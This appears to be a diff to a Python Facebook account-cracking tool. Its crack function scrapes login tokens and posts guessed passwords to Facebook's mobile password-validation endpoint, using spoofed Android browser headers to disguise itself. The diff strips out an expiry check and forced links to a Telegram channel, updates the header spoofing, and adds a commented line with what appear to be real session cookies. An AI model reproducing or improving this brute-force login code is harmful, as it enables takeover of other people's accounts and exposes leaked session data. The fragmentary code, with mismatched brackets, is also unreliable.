@@ -2,32 +2,6 @@ import os
 import sys
 import time
 import requests,bs4,json,os,sys,random,datetime,time,re
-from datetime import *
-def stoped(y=0,m=0,d=0):
- date = datetime.now()
- if len(list(str(y))) == 4:
-  if m <= 11 and m > 0:
-   if d <= 6 and d > 0:
-    if date.year <= y:
-     if date.month <= m:
-      if date.day < d:
-       return True
-x = stoped(2024,4,17)
-os.system('xdg-open  https://t.me/KILLER_CRAaCKER')
-if x:pass
-else:quit('This tool hass ben expired')
-os.system('xdg-open  https://t.me/KILLER_CRAaCKER')
-print("TOLL WORKING @l4m_rawa")
-import os
-try:
-	import requests
-except ImportError:
-	os.system("pip install requests")
-
-try:
-	import concurrent.futures
-except ImportError:
-	os.system("pip install futures")
 import urllib3,rich,base64,uuid
 from rich.table import Table as me
 from rich.console import Console as sol
@@ -327,8 +301,8 @@ def crack(idf,pwv):
     'cache-control': 'max-age=0',
     'dpr': '2.75',
     'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-model': '"Redmi Note 8 Pro"',
     'sec-ch-ua-platform': '"Android"',
@@ -339,9 +313,9 @@ def crack(idf,pwv):
     'sec-fetch-user': '?1',
     'raferer': 'https://p.facebook.com/',
     'upgrade-insecure-requests': '1',
-    'user-agent': ua2,
+    'user-agent': ua,
     'viewport-width': '980',
-})
+}
 			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
@@ -350,10 +324,11 @@ def crack(idf,pwv):
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
+    # 'cookie': 'ps_l=0; ps_n=0; datr=dBoEZlFwiczlEmDtSzVp6Idq; sb=dBoEZlytZNV6ucPz53mA_Ues; locale=ar_AR; vpd=v1%3B720x393x2.75; wl_cbv=v2%3Bclient_version%3A2454%3Btimestamp%3A1712069163; m_pixel_ratio=2.75; wd=393x720; fr=0EqipvJjXRT8QKiCJ.AWUH2NKwNNGAIsRwbJ88LG1PQ5g.BmBBp0..AAA.0.0.BmDCAP.AWXbzDhA8uY',
     'dpr': '2.75',
     'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-model': '"Redmi Note 8 Pro"',
     'sec-ch-ua-platform': '"Android"',
@@ -364,7 +339,7 @@ def crack(idf,pwv):
     'sec-fetch-user': '?1',
     'raferer': 'https://p.facebook.com/',
     'upgrade-insecure-requests': '1',
-    'user-agent': ua2,
+    'user-agent': ua,
     'viewport-width': '980',
 }
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
